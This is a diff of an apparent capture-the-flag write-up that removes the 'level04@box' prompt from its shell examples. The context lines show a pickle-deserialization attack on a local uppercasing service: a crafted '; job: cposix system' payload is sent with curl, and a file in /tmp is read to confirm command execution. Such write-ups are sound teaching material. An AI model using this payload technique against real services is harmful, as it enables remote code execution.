@@ -9,7 +9,7 @@ What can we see easily?
 The description tells us the program is uppercasing service,
 and we can use like this:
 ```
-level04@box:~$ curl localhost:8005 -d 'hello friend'
+$ curl localhost:8005 -d 'hello friend'
 {
     "processing_time": 1.621246337890625e-05, 
     "queue_time": 0.2028050422668457, 
@@ -87,7 +87,7 @@ We don't know yet how this serialized string is used later in the program,
 but having two `job:` might be an interesting corner case.
 Let's see what actually happens if we call the service with such input:
 ```
-level04@box:~$ curl localhost:8005 -d 'x; job: hello'
+$ curl localhost:8005 -d 'x; job: hello'
 {
     "result": "Job timed out"
 }
@@ -165,7 +165,7 @@ Let's save this in a file,
 say `exploit.py`,
 run it, and save its output in a text file:
 ```
-level04@box:~$ python exploit.py | tee pickle.txt
+$ python exploit.py | tee pickle.txt
 ; job: cposix
 system
 p0
@@ -179,11 +179,11 @@ Our crafted input has the right prefix,
 `; job: `,
 let's send this to the service:
 ```
-level04@box:~$ curl localhost:8005 --data-urlencode @pickle.txt
+$ curl localhost:8005 --data-urlencode @pickle.txt
 {
     "result": "Job timed out"
 }
-level04@box:~$ cat /tmp/p
+$ cat /tmp/p
 diebasuw
 ```
 
